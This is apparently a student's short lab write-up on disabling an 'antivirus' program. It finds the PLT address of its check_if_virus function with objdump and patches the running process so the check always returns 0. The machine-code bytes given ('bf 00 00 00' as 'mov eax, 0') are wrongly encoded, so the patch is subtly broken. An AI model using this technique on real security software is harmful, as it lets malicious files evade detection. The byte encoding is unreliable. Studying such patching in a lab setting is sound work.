I found the address to override by runnning:
"objdump -M intel -d binaries/antivirus | grep check_if_virus"
Then I copied from the output the address of check_if_virus at the PLT.
The reason for doing so is that check_if_virus is called by jumping to 
its snippet at the PLT.

After patching an antivures process code, each call to check_if_virus
will jump to my patching (which will always return 0):
bf 00 00 00   =   mov eax, 0
c3            =   ret
